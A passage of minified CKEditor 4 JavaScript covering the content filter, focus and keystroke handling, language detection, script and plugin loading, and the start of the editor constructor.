                if (!e.attributes.src) return !1;
            }
            return !0;
        }
        function v(t) {
            if (!t) return !1;
            if (!0 === t) return !0;
            var n = function(e) {
                var t, n = [];
                for (t in e) -1 < t.indexOf("*") && n.push(t.replace(/\*/g, ".*"));
                return n.length ? RegExp("^(?:" + n.join("|") + ")$") : null;
            }(t);
            return function(e) {
                return e in t || n && e.match(n);
            };
        }
        function m() {
            return new CKEDITOR.htmlParser.element("br");
        }
        function g(e) {
            return e.type == CKEDITOR.NODE_ELEMENT && ("br" == e.name || k.$block[e.name]);
        }
        function E(e, t, n) {
            if (o = e.name, k.$empty[o] || !e.children.length) "hr" == o && "br" == t ? e.replaceWith(m()) : (e.parent && n.push({
                check: "it",
                el: e.parent
            }), e.remove()); else if (k.$block[o] || "tr" == o) if ("br" == t) e.previous && !g(e.previous) && (t = m()).insertBefore(e),
            e.next && !g(e.next) && (t = m()).insertAfter(e), e.replaceWithChildren(); else {
                var i, o = e.children;
                e: {
                    i = k[t];
                    for (var a, r = 0, s = o.length; r < s; ++r) if ((a = o[r]).type == CKEDITOR.NODE_ELEMENT && !i[a.name]) {
                        i = !1;
                        break e;
                    }
                    i = !0;
                }
                if (i) e.name = t, e.attributes = {}, n.push({
                    check: "parent-down",
                    el: e
                }); else {
                    var l, c;
                    for (r = (i = e.parent).type == CKEDITOR.NODE_DOCUMENT_FRAGMENT || "body" == i.name,
                    s = o.length; 0 < s; ) a = o[--s], r && (a.type == CKEDITOR.NODE_TEXT || a.type == CKEDITOR.NODE_ELEMENT && k.$inline[a.name]) ? (l || ((l = new CKEDITOR.htmlParser.element(t)).insertAfter(e),
                    n.push({
                        check: "parent-down",
                        el: l
                    })), l.add(a, 0)) : (l = null, c = k[i.name] || k.span, a.insertAfter(e), i.type != CKEDITOR.NODE_DOCUMENT_FRAGMENT && a.type == CKEDITOR.NODE_ELEMENT && !c[a.name] && n.push({
                        check: "el-up",
                        el: a
                    }));
                    e.remove();
                }
            } else "style" == o ? e.remove() : (e.parent && n.push({
                check: "it",
                el: e.parent
            }), e.replaceWithChildren());
        }
        function b(e, t, n) {
            var i, o;
            for (i = 0; i < n.length; ++i) if ((!(o = n[i]).check || e.check(o.check, !1)) && (!o.left || o.left(t))) {
                o.right(t, M);
                break;
            }
        }
        function n(e, t) {
            var n, i, o, a, r = t.getDefinition(), s = r.attributes, l = r.styles;
            if (e.name != r.element) return !1;
            for (n in s) if ("class" == n) {
                for (r = s[n].split(/\s+/), o = e.classes.join("|"); a = r.pop(); ) if (-1 == o.indexOf(a)) return !1;
            } else if (e.attributes[n] != s[n]) return !1;
            for (i in l) if (e.styles[i] != l[i]) return !1;
            return !0;
        }
        function p(e, n) {
            var t, i;
            return "string" == typeof e ? t = e : e instanceof CKEDITOR.style ? i = e : (t = e[0],
            i = e[1]), [ {
                element: t,
                left: i,
                right: function(e, t) {
                    t.transform(e, n);
                }
            } ];
        }
        function K(t) {
            return function(e) {
                return n(e, t);
            };
        }
        function y(n) {
            return function(e, t) {
                t[n](e);
            };
        }
        var o, _, k = CKEDITOR.dtd, N = 1, S = CKEDITOR.tools.copy, w = CKEDITOR.tools.trim, x = "cke-test", A = [ "", "p", "br", "div" ];
        CKEDITOR.FILTER_SKIP_TREE = 2, CKEDITOR.filter = function(e) {
            if (this.allowedContent = [], this.disallowedContent = [], this.elementCallbacks = null,
            this.disabled = !1, this.editor = null, this.id = CKEDITOR.tools.getNextNumber(),
            this._ = {
                allowedRules: {
                    elements: {},
                    generic: []
                },
                disallowedRules: {
                    elements: {},
                    generic: []
                },
                transformations: {},
                cachedTests: {}
            }, CKEDITOR.filter.instances[this.id] = this, e instanceof CKEDITOR.editor) {
                e = this.editor = e, this.customConfig = !0;
                var t = e.config.allowedContent;
                !0 === t ? this.disabled = !0 : (t || (this.customConfig = !1), this.allow(t, "config", 1),
                this.allow(e.config.extraAllowedContent, "extra", 1), this.allow(A[e.enterMode] + " " + A[e.shiftEnterMode], "default", 1),
                this.disallow(e.config.disallowedContent));
            } else this.customConfig = !1, this.allow(e, "default", 1);
        }, CKEDITOR.filter.instances = {}, CKEDITOR.filter.prototype = {
            allow: function(e, t, n) {
                if (!l(this, e, n)) return !1;
                var i, o;
                if ("string" == typeof e) e = u(e); else if (e instanceof CKEDITOR.style) {
                    if (e.toAllowedContentRules) return this.allow(e.toAllowedContentRules(this.editor), t, n);
                    i = e.getDefinition(), e = {}, n = i.attributes, e[i.element] = i = {
                        styles: i.styles,
                        requiredStyles: i.styles && CKEDITOR.tools.objectKeys(i.styles)
                    }, n && (n = S(n), i.classes = n.class ? n.class.split(/\s+/) : null, i.requiredClasses = i.classes,
                    delete n.class, i.attributes = n, i.requiredAttributes = n && CKEDITOR.tools.objectKeys(n));
                } else if (CKEDITOR.tools.isArray(e)) {
                    for (i = 0; i < e.length; ++i) o = this.allow(e[i], t, n);
                    return o;
                }
                return a(this, e, t, this.allowedContent, this._.allowedRules), !0;
            },
            applyTo: function(e, r, t, n) {
                if (this.disabled) return !1;
                var s, i, o, l = this, c = [], d = this.editor && this.editor.config.protectedSource, u = !1, h = {
                    doFilter: !t,
                    doTransform: !0,
                    doCallbacks: !0,
                    toHtml: r
                };
                for (e.forEach(function(e) {
                    if (e.type == CKEDITOR.NODE_ELEMENT) {
                        if ("off" == e.attributes["data-cke-filter"]) return !1;
                        if (!r || "span" != e.name || !~CKEDITOR.tools.objectKeys(e.attributes).join("|").indexOf("data-cke-")) if ((s = f(l, e, c, h)) & N) u = !0; else if (2 & s) return !1;
                    } else if (e.type == CKEDITOR.NODE_COMMENT && e.value.match(/^\{cke_protected\}(?!\{C\})/)) {
                        var t;
                        e: {
                            var n, i, o, a = decodeURIComponent(e.value.replace(/^\{cke_protected\}/, ""));
                            if (t = [], d) for (i = 0; i < d.length; ++i) if ((o = a.match(d[i])) && o[0].length == a.length) {
                                t = !0;
                                break e;
                            }
                            1 == (a = CKEDITOR.htmlParser.fragment.fromHtml(a)).children.length && (n = a.children[0]).type == CKEDITOR.NODE_ELEMENT && f(l, n, t, h),
                            t = !t.length;
                        }
                        t || c.push(e);
                    }
                }, null, !0), c.length && (u = !0), e = [], n = A[n || (this.editor ? this.editor.enterMode : CKEDITOR.ENTER_P)]; t = c.pop(); ) t.type == CKEDITOR.NODE_ELEMENT ? E(t, n, e) : t.remove();
                for (;i = e.pop(); ) if ((t = i.el).parent) switch (o = k[t.parent.name] || k.span,
                i.check) {
                  case "it":
                    k.$removeEmpty[t.name] && !t.children.length ? E(t, n, e) : R(t) || E(t, n, e);
                    break;

                  case "el-up":
                    t.parent.type != CKEDITOR.NODE_DOCUMENT_FRAGMENT && !o[t.name] && E(t, n, e);
                    break;

                  case "parent-down":
                    t.parent.type != CKEDITOR.NODE_DOCUMENT_FRAGMENT && !o[t.name] && E(t.parent, n, e);
                }
                return u;
            },
            checkFeature: function(e) {
                return !(!this.disabled && e) || (e.toFeature && (e = e.toFeature(this.editor)),
                !e.requiredContent || this.check(e.requiredContent));
            },
            disable: function() {
                this.disabled = !0;
            },
            disallow: function(e) {
                return !!l(this, e, !0) && ("string" == typeof e && (e = u(e)), a(this, e, null, this.disallowedContent, this._.disallowedRules),
                !0);
            },
            addContentForms: function(e) {
                if (!this.disabled && e) {
                    var t, n, i, o = [];
                    for (t = 0; t < e.length && !i; ++t) ("string" == typeof (n = e[t]) || n instanceof CKEDITOR.style) && this.check(n) && (i = n);
                    if (i) {
                        for (t = 0; t < e.length; ++t) o.push(p(e[t], i));
                        this.addTransformations(o);
                    }
                }
            },
            addElementCallback: function(e) {
                this.elementCallbacks || (this.elementCallbacks = []), this.elementCallbacks.push(e);
            },
            addFeature: function(e) {
                return !(!this.disabled && e) || (e.toFeature && (e = e.toFeature(this.editor)),
                this.allow(e.allowedContent, e.name), this.addTransformations(e.contentTransformations),
                this.addContentForms(e.contentForms), !e.requiredContent || !this.customConfig && !this.disallowedContent.length || this.check(e.requiredContent));
            },
            addTransformations: function(e) {
                var t, n;
                if (!this.disabled && e) {
                    var i, o = this._.transformations;
                    for (i = 0; i < e.length; ++i) {
                        t = e[i];
                        var a = void 0, r = void 0, s = void 0, l = void 0, c = void 0, d = void 0;
                        for (n = [], r = 0; r < t.length; ++r) "string" == typeof (s = t[r]) ? (l = (s = s.split(/\s*:\s*/))[0],
                        c = null, d = s[1]) : (l = s.check, c = s.left, d = s.right), a || (a = (a = s).element ? a.element : l ? l.match(/^([a-z0-9]+)/i)[0] : a.left.getDefinition().element),
                        c instanceof CKEDITOR.style && (c = K(c)), n.push({
                            check: l == a ? null : l,
                            left: c,
                            right: "string" == typeof d ? y(d) : d
                        });
                        o[t = a] || (o[t] = []), o[t].push(n);
                    }
                }
            },
            check: function(e, t, n) {
                if (this.disabled) return !0;
                if (CKEDITOR.tools.isArray(e)) {
                    for (var i = e.length; i--; ) if (this.check(e[i], t, n)) return !0;
                    return !1;
                }
                var o, a;
                if ("string" == typeof e) {
                    if ((a = e + "<" + (!1 === t ? "0" : "1") + (n ? "1" : "0") + ">") in this._.cachedChecks) return this._.cachedChecks[a];
                    o = (i = u(e).$1).styles, s = i.classes, i.name = i.elements, i.classes = s = s ? s.split(/\s*,\s*/) : [],
                    i.styles = d(o), i.attributes = d(i.attributes), i.children = [], s.length && (i.attributes.class = s.join(" ")),
                    o && (i.attributes.style = CKEDITOR.tools.writeCssText(i.styles)), o = i;
                } else o = (i = e.getDefinition()).styles, s = i.attributes || {}, o ? (o = S(o),
                s.style = CKEDITOR.tools.writeCssText(o, !0)) : o = {}, o = {
                    name: i.element,
                    attributes: s,
                    classes: s.class ? s.class.split(/\s+/) : [],
                    styles: o,
                    children: []
                };
                var r, s = CKEDITOR.tools.clone(o), l = [];
                if (!1 !== t && (r = this._.transformations[o.name])) {
                    for (i = 0; i < r.length; ++i) b(this, o, r[i]);
                    D(o);
                }
                return f(this, s, l, {
                    doFilter: !0,
                    doTransform: !1 !== t,
                    skipRequired: !n,
                    skipFinalValidation: !n
                }), t = !(0 < l.length || !CKEDITOR.tools.objectCompare(o.attributes, s.attributes, !0)),
                "string" == typeof e && (this._.cachedChecks[a] = t), t;
            },
            getAllowedEnterMode: (o = [ "p", "div", "br" ], _ = {
                p: CKEDITOR.ENTER_P,
                div: CKEDITOR.ENTER_DIV,
                br: CKEDITOR.ENTER_BR
            }, function(e, t) {
                var n, i = o.slice();
                if (this.check(A[e])) return e;
                for (t || (i = i.reverse()); n = i.pop(); ) if (this.check(n)) return _[n];
                return CKEDITOR.ENTER_BR;
            }),
            destroy: function() {
                delete CKEDITOR.filter.instances[this.id], delete this._, delete this.allowedContent,
                delete this.disallowedContent;
            }
        };
        var L = {
            styles: 1,
            attributes: 1,
            classes: 1
        }, B = {
            styles: "requiredStyles",
            attributes: "requiredAttributes",
            classes: "requiredClasses"
        }, P = /^([a-z0-9\-*\s]+)((?:\s*\{[!\w\-,\s\*]+\}\s*|\s*\[[!\w\-,\s\*]+\]\s*|\s*\([!\w\-,\s\*]+\)\s*){0,3})(?:;\s*|$)/i, i = {
            styles: /{([^}]+)}/,
            attrs: /\[([^\]]+)\]/,
            classes: /\(([^\)]+)\)/
        }, F = /^cke:(object|embed|param)$/, $ = /^(object|embed|param)$/, M = CKEDITOR.filter.transformationsTools = {
            sizeToStyle: function(e) {
                this.lengthToStyle(e, "width"), this.lengthToStyle(e, "height");
            },
            sizeToAttribute: function(e) {
                this.lengthToAttribute(e, "width"), this.lengthToAttribute(e, "height");
            },
            lengthToStyle: function(e, t, n) {
                if (!((n = n || t) in e.styles)) {
                    var i = e.attributes[t];
                    i && (/^\d+$/.test(i) && (i += "px"), e.styles[n] = i);
                }
                delete e.attributes[t];
            },
            lengthToAttribute: function(e, t, n) {
                if (!((n = n || t) in e.attributes)) {
                    var i = e.styles[t], o = i && i.match(/^(\d+)(?:\.\d*)?px$/);
                    o ? e.attributes[n] = o[1] : i == x && (e.attributes[n] = x);
                }
                delete e.styles[t];
            },
            alignmentToStyle: function(e) {
                if (!("float" in e.styles)) {
                    var t = e.attributes.align;
                    "left" != t && "right" != t || (e.styles.float = t);
                }
                delete e.attributes.align;
            },
            alignmentToAttribute: function(e) {
                if (!("align" in e.attributes)) {
                    var t = e.styles.float;
                    "left" != t && "right" != t || (e.attributes.align = t);
                }
                delete e.styles.float;
            },
            matchesStyle: n,
            transform: function(e, t) {
                if ("string" == typeof t) e.name = t; else {
                    var n, i, o, a, r = t.getDefinition(), s = r.styles, l = r.attributes;
                    for (n in e.name = r.element, l) if ("class" == n) for (r = e.classes.join("|"),
                    o = l[n].split(/\s+/); a = o.pop(); ) -1 == r.indexOf(a) && e.classes.push(a); else e.attributes[n] = l[n];
                    for (i in s) e.styles[i] = s[i];
                }
            }
        };
    }(), CKEDITOR.focusManager = function(e) {
        return e.focusManager ? e.focusManager : (this.hasFocus = !1, this.currentActive = null,
        this._ = {
            editor: e
        }, this);
    }, CKEDITOR.focusManager._ = {
        blurDelay: 200
    }, CKEDITOR.focusManager.prototype = {
        focus: function(e) {
            this._.timer && clearTimeout(this._.timer), e && (this.currentActive = e), this.hasFocus || this._.locked || ((e = CKEDITOR.currentInstance) && e.focusManager.blur(1),
            this.hasFocus = !0, (e = this._.editor.container) && e.addClass("cke_focus"), this._.editor.fire("focus"));
        },
        lock: function() {
            this._.locked = 1;
        },
        unlock: function() {
            delete this._.locked;
        },
        blur: function(e) {
            function t() {
                if (this.hasFocus) {
                    this.hasFocus = !1;
                    var e = this._.editor.container;
                    e && e.removeClass("cke_focus"), this._.editor.fire("blur");
                }
            }
            if (!this._.locked) {
                this._.timer && clearTimeout(this._.timer);
                var n = CKEDITOR.focusManager._.blurDelay;
                e || !n ? t.call(this) : this._.timer = CKEDITOR.tools.setTimeout(function() {
                    delete this._.timer, t.call(this);
                }, n, this);
            }
        },
        add: function(e, t) {
            if (!(n = e.getCustomData("focusmanager")) || n != this) {
                n && n.remove(e);
                var n = "focus", i = "blur";
                t && (CKEDITOR.env.ie ? (n = "focusin", i = "focusout") : CKEDITOR.event.useCapture = 1);
                var o = {
                    blur: function() {
                        e.equals(this.currentActive) && this.blur();
                    },
                    focus: function() {
                        this.focus(e);
                    }
                };
                e.on(n, o.focus, this), e.on(i, o.blur, this), t && (CKEDITOR.event.useCapture = 0),
                e.setCustomData("focusmanager", this), e.setCustomData("focusmanager_handlers", o);
            }
        },
        remove: function(e) {
            e.removeCustomData("focusmanager");
            var t = e.removeCustomData("focusmanager_handlers");
            e.removeListener("blur", t.blur), e.removeListener("focus", t.focus);
        }
    }, CKEDITOR.keystrokeHandler = function(e) {
        return e.keystrokeHandler ? e.keystrokeHandler : (this.keystrokes = {}, this.blockedKeystrokes = {},
        this._ = {
            editor: e
        }, this);
    }, K = function(e) {
        var t = (e = e.data).getKeystroke(), n = this.keystrokes[t], i = this._.editor;
        return (b = !1 === i.fire("key", {
            keyCode: t,
            domEvent: e
        })) || (n && (b = !1 !== i.execCommand(n, {
            from: "keystrokeHandler"
        })), b || (b = !!this.blockedKeystrokes[t])), b && e.preventDefault(!0), !b;
    }, y = function(e) {
        b && (b = !1, e.data.preventDefault(!0));
    }, CKEDITOR.keystrokeHandler.prototype = {
        attach: function(e) {
            e.on("keydown", K, this), CKEDITOR.env.gecko && CKEDITOR.env.mac && e.on("keypress", y, this);
        }
    }, CKEDITOR.lang = {
        languages: {
            af: 1,
            ar: 1,
            bg: 1,
            bn: 1,
            bs: 1,
            ca: 1,
            cs: 1,
            cy: 1,
            da: 1,
            de: 1,
            el: 1,
            "en-au": 1,
            "en-ca": 1,
            "en-gb": 1,
            en: 1,
            eo: 1,
            es: 1,
            et: 1,
            eu: 1,
            fa: 1,
            fi: 1,
            fo: 1,
            "fr-ca": 1,
            fr: 1,
            gl: 1,
            gu: 1,
            he: 1,
            hi: 1,
            hr: 1,
            hu: 1,
            id: 1,
            is: 1,
            it: 1,
            ja: 1,
            ka: 1,
            km: 1,
            ko: 1,
            ku: 1,
            lt: 1,
            lv: 1,
            mk: 1,
            mn: 1,
            ms: 1,
            nb: 1,
            nl: 1,
            no: 1,
            pl: 1,
            "pt-br": 1,
            pt: 1,
            ro: 1,
            ru: 1,
            si: 1,
            sk: 1,
            sl: 1,
            sq: 1,
            "sr-latn": 1,
            sr: 1,
            sv: 1,
            th: 1,
            tr: 1,
            tt: 1,
            ug: 1,
            uk: 1,
            vi: 1,
            "zh-cn": 1,
            zh: 1
        },
        rtl: {
            ar: 1,
            fa: 1,
            he: 1,
            ku: 1,
            ug: 1
        },
        load: function(e, t, n) {
            e && CKEDITOR.lang.languages[e] || (e = this.detect(t, e));
            var i = this;
            t = function() {
                i[e].dir = i.rtl[e] ? "rtl" : "ltr", n(e, i[e]);
            }, this[e] ? t() : CKEDITOR.scriptLoader.load(CKEDITOR.getUrl("lang/" + e + ".js"), t, this);
        },
        detect: function(e, t) {
            var n = this.languages, i = (o = (t = t || navigator.userLanguage || navigator.language || e).toLowerCase().match(/([a-z]+)(?:-([a-z]+))?/))[1], o = o[2];
            return n[i + "-" + o] ? i = i + "-" + o : n[i] || (i = null), CKEDITOR.lang.detect = i ? function() {
                return i;
            } : function(e) {
                return e;
            }, i || e;
        }
    }, CKEDITOR.scriptLoader = (R = {}, v = {}, {
        load: function(e, i, t, n) {
            var o = "string" == typeof e;
            o && (e = [ e ]), t || (t = CKEDITOR);
            var a = e.length, r = [], s = [], l = function(e) {
                i && (o ? i.call(t, e) : i.call(t, r, s));
            };
            if (0 === a) l(!0); else {
                var c = function(e, t) {
                    (t ? r : s).push(e), --a <= 0 && (n && CKEDITOR.document.getDocumentElement().removeStyle("cursor"),
                    l(t));
                }, d = function(e, t) {
                    R[e] = 1;
                    var n = v[e];
                    delete v[e];
                    for (var i = 0; i < n.length; i++) n[i](e, t);
                };
                n && CKEDITOR.document.getDocumentElement().setStyle("cursor", "wait");
                for (var u = 0; u < a; u++) !function(e) {
                    if (R[e]) c(e, !0); else {
                        var t = v[e] || (v[e] = []);
                        if (t.push(c), !(1 < t.length)) {
                            var n = new CKEDITOR.dom.element("script");
                            n.setAttributes({
                                type: "text/javascript",
                                src: e
                            }), i && (CKEDITOR.env.ie && CKEDITOR.env.version < 11 ? n.$.onreadystatechange = function() {
                                "loaded" != n.$.readyState && "complete" != n.$.readyState || (n.$.onreadystatechange = null,
                                d(e, !0));
                            } : (n.$.onload = function() {
                                setTimeout(function() {
                                    d(e, !0);
                                }, 0);
                            }, n.$.onerror = function() {
                                d(e, !1);
                            })), n.appendTo(CKEDITOR.document.getHead());
                        }
                    }
                }(e[u]);
            }
        },
        queue: function() {
            function i() {
                var e;
                (e = o[0]) && this.load(e.scriptUrl, e.callback, CKEDITOR, 0);
            }
            var o = [];
            return function(e, t) {
                var n = this;
                o.push({
                    scriptUrl: e,
                    callback: function() {
                        t && t.apply(this, arguments), o.shift(), i.call(n);
                    }
                }), 1 == o.length && i.call(this);
            };
        }()
    }), CKEDITOR.resourceManager = function(e, t) {
        this.basePath = e, this.fileName = t, this.registered = {}, this.loaded = {}, this.externals = {},
        this._ = {
            waitingList: {}
        };
    }, CKEDITOR.resourceManager.prototype = {
        add: function(e, t) {
            if (this.registered[e]) throw '[CKEDITOR.resourceManager.add] The resource name "' + e + '" is already registered.';
            var n = this.registered[e] = t || {};
            return n.name = e, n.path = this.getPath(e), CKEDITOR.fire(e + CKEDITOR.tools.capitalize(this.fileName) + "Ready", n),
            this.get(e);
        },
        get: function(e) {
            return this.registered[e] || null;
        },
        getPath: function(e) {
            var t = this.externals[e];
            return CKEDITOR.getUrl(t && t.dir || this.basePath + e + "/");
        },
        getFilePath: function(e) {
            var t = this.externals[e];
            return CKEDITOR.getUrl(this.getPath(e) + (t ? t.file : this.fileName + ".js"));
        },
        addExternal: function(e, t, n) {
            e = e.split(",");
            for (var i = 0; i < e.length; i++) {
                var o = e[i];
                n || (t = t.replace(/[^\/]+$/, function(e) {
                    return n = e, "";
                })), this.externals[o] = {
                    dir: t,
                    file: n || this.fileName + ".js"
                };
            }
        },
        load: function(e, r, s) {
            CKEDITOR.tools.isArray(e) || (e = e ? [ e ] : []);
            for (var l = this.loaded, t = this.registered, n = [], c = {}, d = {}, i = 0; i < e.length; i++) {
                var o = e[i];
                if (o) if (l[o] || t[o]) d[o] = this.get(o); else {
                    var a = this.getFilePath(o);
                    n.push(a), a in c || (c[a] = []), c[a].push(o);
                }
            }
            CKEDITOR.scriptLoader.load(n, function(e, t) {
                if (t.length) throw '[CKEDITOR.resourceManager.load] Resource name "' + c[t[0]].join(",") + '" was not found at "' + t[0] + '".';
                for (var n = 0; n < e.length; n++) for (var i = c[e[n]], o = 0; o < i.length; o++) {
                    var a = i[o];
                    d[a] = this.get(a), l[a] = 1;
                }
                r.call(s, d);
            }, this);
        }
    }, CKEDITOR.plugins = new CKEDITOR.resourceManager("plugins/", "plugin"), CKEDITOR.plugins.load = CKEDITOR.tools.override(CKEDITOR.plugins.load, function(t) {
        var u = {};
        return function(e, s, l) {
            var c = {}, d = function(e) {
                t.call(this, e, function(e) {
                    CKEDITOR.tools.extend(c, e);
                    var t, n = [];
                    for (t in e) {
                        var i = e[t], o = i && i.requires;
                        if (!u[t]) {
                            if (i.icons) for (var a = i.icons.split(","), r = a.length; r--; ) CKEDITOR.skin.addIcon(a[r], i.path + "icons/" + (CKEDITOR.env.hidpi && i.hidpi ? "hidpi/" : "") + a[r] + ".png");
                            u[t] = 1;
                        }
                        if (o) for (o.split && (o = o.split(",")), i = 0; i < o.length; i++) c[o[i]] || n.push(o[i]);
                    }
                    if (n.length) d.call(this, n); else {
                        for (t in c) (i = c[t]).onLoad && !i.onLoad._called && (!1 === i.onLoad() && delete c[t],
                        i.onLoad._called = 1);
                        s && s.call(l || window, c);
                    }
                }, this);
            };
            d.call(this, e);
        };
    }), CKEDITOR.plugins.setLang = function(e, t, n) {
        var i = this.get(e);
        e = i.langEntries || (i.langEntries = {}), (i = i.lang || (i.lang = [])).split && (i = i.split(",")),
        -1 == CKEDITOR.tools.indexOf(i, t) && i.push(t), e[t] = n;
    }, CKEDITOR.ui = function(e) {
        return e.ui ? e.ui : (this.items = {}, this.instances = {}, this.editor = e, this._ = {
            handlers: {}
        }, this);
    }, CKEDITOR.ui.prototype = {
        add: function(e, t, n) {
            n.name = e.toLowerCase();
            var i = this.items[e] = {
                type: t,
                command: n.command || null,
                args: Array.prototype.slice.call(arguments, 2)
            };
            CKEDITOR.tools.extend(i, n);
        },
        get: function(e) {
            return this.instances[e];
        },
        create: function(e) {
            var t = this.items[e], n = t && this._.handlers[t.type], i = t && t.command && this.editor.getCommand(t.command);
            return n = n && n.create.apply(this, t.args), this.instances[e] = n, i && i.uiItems.push(n),
            n && !n.type && (n.type = t.type), n;
        },
        addHandler: function(e, t) {
            this._.handlers[e] = t;
        },
        space: function(e) {
            return CKEDITOR.document.getById(this.spaceId(e));
        },
        spaceId: function(e) {
            return this.editor.id + "_" + e;
        }
    }, CKEDITOR.event.implementOn(CKEDITOR.ui), function() {
        function e(e, t, n) {
            if (CKEDITOR.event.call(this), e = e && CKEDITOR.tools.clone(e), void 0 !== t) {
                if (!(t instanceof CKEDITOR.dom.element)) throw Error("Expect element of type CKEDITOR.dom.element.");
                if (!n) throw Error("One of the element modes must be specified.");
                if (CKEDITOR.env.ie && CKEDITOR.env.quirks && n == CKEDITOR.ELEMENT_MODE_INLINE) throw Error("Inline element mode is not supported on IE quirks.");
                if (!(n == CKEDITOR.ELEMENT_MODE_INLINE ? t.is(CKEDITOR.dtd.$editable) || t.is("textarea") : n != CKEDITOR.ELEMENT_MODE_REPLACE || !t.is(CKEDITOR.dtd.$nonBodyContent))) throw Error('The specified element mode is not supported on element: "' + t.getName() + '".');
                this.element = t, this.elementMode = n, this.name = this.elementMode != CKEDITOR.ELEMENT_MODE_APPENDTO && (t.getId() || t.getNameAtt());
            } else this.elementMode = CKEDITOR.ELEMENT_MODE_NONE;
            this._ = {}, this.commands = {}, this.templates = {}, this.name = this.name || function() {
                do {
                    var e = "editor" + ++r;
                } while (CKEDITOR.instances[e]);
                return e;
            }(), this.id = CKEDITOR.tools.getNextId(), this.status = "unloaded", this.config = CKEDITOR.tools.prototypedCopy(CKEDITOR.config),
            this.ui = new CKEDITOR.ui(this), this.focusManager = new CKEDITOR.focusManager(this),
            this.keystrokeHandler = new CKEDITOR.keystrokeHandler(this), this.on("readOnly", i),
            this.on("selectionChange", function(e) {
                a(this, e.data.path);
            }), this.on("activeFilterChange", function() {
                a(this, this.elementPath(), !0);
            }), this.on("mode", i), this.on("instanceReady", function() {
                this.config.startupFocus && this.focus();
            }), CKEDITOR.fire("instanceCreated", null, this), CKEDITOR.add(this), CKEDITOR.tools.setTimeout(function() {
                var n, i;
                i = e, (n = this).on("customConfigLoaded", function() {
                    if (i) {
                        if (i.on) for (var e in i.on) n.on(e, i.on[e]);
                        CKEDITOR.tools.extend(n.config, i, !0), delete n.config.on;
                    }
                    var t;
                    e = n.config, n.readOnly = !(!e.readOnly && !(n.elementMode == CKEDITOR.ELEMENT_MODE_INLINE ? n.element.is("textarea") ? n.element.hasAttribute("disabled") : n.element.isReadOnly() : n.elementMode == CKEDITOR.ELEMENT_MODE_REPLACE && n.element.hasAttribute("disabled"))),
                    n.blockless = n.elementMode == CKEDITOR.ELEMENT_MODE_INLINE && !(n.element.is("textarea") || CKEDITOR.dtd[n.element.getName()].p),
                    n.tabIndex = e.tabIndex || n.element && n.element.getAttribute("tabindex") || 0,
                    n.activeEnterMode = n.enterMode = n.blockless ? CKEDITOR.ENTER_BR : e.enterMode,
                    n.activeShiftEnterMode = n.shiftEnterMode = n.blockless ? CKEDITOR.ENTER_BR : e.shiftEnterMode,
                    e.skin && (CKEDITOR.skinName = e.skin), n.fireOnce("configLoaded"), n.dataProcessor = new CKEDITOR.htmlDataProcessor(n),
                    n.filter = n.activeFilter = new CKEDITOR.filter(n), t = n, CKEDITOR.skin.loadPart("editor", function() {
                        var o;
                        o = t, CKEDITOR.lang.load(o.config.language, o.config.defaultLanguage, function(e, t) {
                            var n, i = o.config.title;
                            o.langCode = e, o.lang = CKEDITOR.tools.prototypedCopy(t), o.title = "string" == typeof i || !1 === i ? i : [ o.lang.editor, o.name ].join(", "),
                            o.config.contentsLangDirection || (o.config.contentsLangDirection = o.elementMode == CKEDITOR.ELEMENT_MODE_INLINE ? o.element.getDirection(1) : o.lang.dir),
                            o.fire("langLoaded"), (n = o).getStylesSet(function(e) {
                                n.once("loaded", function() {
                                    n.fire("stylesSet", {
                                        styles: e
                                    });
                                }, null, null, 1), function(d) {
                                    var u = d.config, e = u.plugins, t = u.extraPlugins, n = u.removePlugins;
                                    if (t) {
                                        var i = RegExp("(?:^|,)(?:" + t.replace(/\s*,\s*/g, "|") + ")(?=,|$)", "g");
                                        e = (e = e.replace(i, "")) + "," + t;
                                    }
                                    if (n) {
                                        var h = RegExp("(?:^|,)(?:" + n.replace(/\s*,\s*/g, "|") + ")(?=,|$)", "g");
                                        e = e.replace(h, "");
                                    }
                                    CKEDITOR.env.air && (e += ",adobeair"), CKEDITOR.plugins.load(e.split(","), function(e) {
                                        var o = [], a = [], t = [];
                                        for (var n in d.plugins = e) {
                                            var i, r = e[n], s = r.lang, l = null, c = r.requires;
                                            if (CKEDITOR.tools.isArray(c) && (c = c.join(",")), c && (i = c.match(h))) for (;c = i.pop(); ) CKEDITOR.tools.setTimeout(function(e, t) {
                                                throw Error('Plugin "' + e.replace(",", "") + '" cannot be removed from the plugins list, because it\'s required by "' + t + '" plugin.');
                                            }, 0, null, [ c, n ]);
                                            s && !d.lang[n] && (s.split && (s = s.split(",")), l = 0 <= CKEDITOR.tools.indexOf(s, d.langCode) ? d.langCode : (l = d.langCode.replace(/-.*/, "")) != d.langCode && 0 <= CKEDITOR.tools.indexOf(s, l) ? l : 0 <= CKEDITOR.tools.indexOf(s, "en") ? "en" : s[0],
                                            r.langEntries && r.langEntries[l] ? (d.lang[n] = r.langEntries[l], l = null) : t.push(CKEDITOR.getUrl(r.path + "lang/" + l + ".js"))),
                                            a.push(l), o.push(r);
                                        }
                                        CKEDITOR.scriptLoader.load(t, function() {
                                            for (var e = [ "beforeInit", "init", "afterInit" ], t = 0; t < e.length; t++) for (var n = 0; n < o.length; n++) {
                                                var i = o[n];
                                                0 === t && a[n] && i.lang && i.langEntries && (d.lang[i.name] = i.langEntries[a[n]]),
                                                i[e[t]] && i[e[t]](d);
                                            }
                                            for (d.fireOnce("pluginsLoaded"), u.keystrokes && d.setKeystroke(d.config.keystrokes),
                                            n = 0; n < d.config.blockedKeystrokes.length; n++) d.keystrokeHandler.blockedKeystrokes[d.config.blockedKeystrokes[n]] = 1;
                                            d.status = "loaded", d.fireOnce("loaded"), CKEDITOR.fire("instanceLoaded", null, d);
                                        });
                                    });
                                }(n);
                            });
                        });
                    });
                }), i && null != i.customConfig && (n.config.customConfig = i.customConfig), function e(t) {
                    if (!(n = t.config.customConfig)) return !1;
                    var n = CKEDITOR.getUrl(n), i = s[n] || (s[n] = {});
                    return i.fn ? (i.fn.call(t, t.config), (CKEDITOR.getUrl(t.config.customConfig) == n || !e(t)) && t.fireOnce("customConfigLoaded")) : CKEDITOR.scriptLoader.queue(n, function() {
                        i.fn = CKEDITOR.editorConfig ? CKEDITOR.editorConfig : function() {}, e(t);
                    }), !0;
                }(n) || n.fireOnce("customConfigLoaded");
            }, 0, this);
        }
        function i() {
            var e, t = this.commands;
            for (e in t) o(this, t[e]);
        }
        function o(e, t) {
            t[t.startDisabled ? "disable" : e.readOnly && !t.readOnly ? "disable" : t.modes[e.mode] ? "enable" : "disable"]();
        }
        function a(e, t, n) {
            if (t) {
                var i, o, a = e.commands;
